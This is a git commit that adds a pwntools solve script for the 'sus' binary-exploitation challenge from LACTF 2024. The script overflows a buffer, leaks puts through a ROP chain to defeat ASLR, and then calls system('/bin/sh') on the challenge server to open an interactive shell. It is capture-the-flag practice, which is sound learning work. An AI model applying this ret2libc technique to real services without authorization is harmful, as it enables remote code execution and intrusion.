fdb490343e6babe6fc7ea4fc8d63ecaabd1ca864
ReiAshizawa <rei11a2004@gmail.com>
2024-02-26 23:23:57 +0900

    solve LACTF/sus

---
+++ 2024/LACTF/sus/solve.py
@@ -0,0 +1,47 @@
+import pwn
+pwn.context.log_level="DEBUG"
+e = pwn.ELF('./sus')
+io = pwn.remote('chall.lac.tf', 31284)
+# io: pwn.tubes.tube.tube = pwn.gdb.debug(
+#     "./sus", "b *0x4011a2", env={"LD_PRELOAD": ""}
+# )
+libc = pwn.ELF('./libc3.so.6')
+ld = pwn.ELF('./ld-linux-x86-64.so.2')
+
+payload = b''
+
+io.recvuntil(b'sus?\n')
+
+offset = 0x38
+payload += b'A' * offset
+payload += pwn.p64(e.got['puts']) # rdi
+payload += pwn.p64(1)
+payload += pwn.p64(e.plt['puts'])
+payload += pwn.p64(e.sym['main'])
+io.sendline(payload)
+
+tmp = io.recv(6)
+leak = pwn.u64(tmp.ljust(8, b"\x00"))
+
+io.recvuntil(b'sus?\n')
+libc_base = leak - libc.sym['puts']
+
+binsh = next(libc.search(b'/bin/sh\x00')) + libc_base
+sys = libc.symbols['system'] + libc_base
+rop = pwn.ROP(libc)
+# print(rop.find_gadget(['ret']).address)
+# print(type(rop.find_gadget(['ret']).address))
+# print(type(libc_base))
+# rop.raw(rop.find_gadget(['ret']).address + libc_base)
+
+payload = b''
+payload += b'A' * offset
+payload += pwn.p64(binsh) # rdi
+payload += pwn.p64(1)
+payload += pwn.p64(rop.find_gadget(['ret']).address + libc_base)
+# payload += rop.chain()
+# payload += b'\x00' * 4
+payload += pwn.p64(sys)
+# payload += pwn.p64(e.sym['main'])
+io.sendline(payload)
+io.interactive()
